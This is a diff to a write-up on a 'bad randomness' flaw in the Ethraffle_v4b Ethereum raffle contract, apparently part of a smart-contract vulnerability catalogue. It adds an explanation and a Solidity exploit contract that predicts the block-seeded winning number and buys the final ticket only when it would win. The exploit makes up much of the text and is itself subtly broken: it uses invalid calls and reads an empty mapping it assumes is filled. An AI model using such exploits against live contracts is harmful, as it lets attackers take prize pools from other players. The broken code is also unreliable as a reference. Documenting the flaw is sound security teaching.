@@ -8,7 +8,7 @@ Bad randomness
 
 Abstract
 ------
-A gambling smart contract implementation for Ethraffle_v4b, an Ethereum gambling game, sells tickets and after the last ticket in a round was sold randomly generates a winner from the buyers who will claim the price, generates a random value that is predictable by attacker. The developer wrote a `chooseWinner()` function that uses block coinbase and difficulty as the seed. This can be predicted by writing the same random function code in an exploit contract to determine the `winningNumber` value.
+A gambling smart contract implementation for Ethraffle_v4b, an Ethereum gambling game, sells tickets and after the last ticket in a round was sold randomly generates a winner from all the buyers who will claim the price, generates a random value that is predictable by attacker. The developer wrote a `chooseWinner()` function that uses block coinbase and difficulty as the seed. This can be predicted by writing the same random function code in an exploit contract to determine the `winningNumber` value.
 
 Related code
 ------
@@ -36,22 +36,45 @@ Related code
         winningAddress.transfer(prize);
     }
 
+Details
+------
+After all tickets in a round(50 ticket for a round) was sold, `chooseWinner()` randomly generates a winner from all the buyers who will claim the price. However, `block.coinbase`, `block.difficulty` and the mapping `contestants` are all readable from etherchain, so the result can be determined in an attack contract.
+
 Exploit
 ------
-    contract attack{
+    contract Exploit{
     
-        function attack(address _target, uint256 roomId, uint256 s_idx, uint256 amount) public payable{
+        Ethraffle_v4b target;
         
-            address[] players;
-            uint256 entryPrice;
+        struct Contestant {
+            address addr;
+            uint raffleId;
+        }
+        //The data of this mapping can be accessed from the chain. We treat it as known here.
+        mapping (uint => Contestant) contestants;
         
-            RuletkaIo target = RuletkaIo(_target);
-            uint256 rand = uint256(uint256(keccak256(block.timestamp, block.difficulty)))%6;
-            if(rand < s_idx){
-                for(uint256 i = s_idx; i<6; i++){
-                    target.enter.value(amount)(roomId);
+        uint constant totalTickets = 50;
+        
+        function Exploit(address _target) public payable{
+            target = Ethraffle_v4b(_target);
+        }
+    
+        function attack(uint256 _amount) public payable{
+        
+            uint current_sold = target.nextTicket;
+            if(current_sold + 1 == totalTickets){
+                address seed1 = contestants[uint(block.coinbase) % totalTickets].addr;
+                address seed2 = contestants[uint(this.address) % totalTickets].addr;
+                uint seed3 = block.difficulty;
+                bytes32 randHash = keccak256(seed1, seed2, seed3);
+                uint winningNumber = uint(randHash) % totalTickets;
+                
+                if(winningNumber + 1 == totalTickets){
+                    target.buyTickets.value(_amount)();
+                    msg.sender.transfer(this.balance);
                 }
+
             }
-            msg.sender.transfer(this.balance);
+            
         }
     }
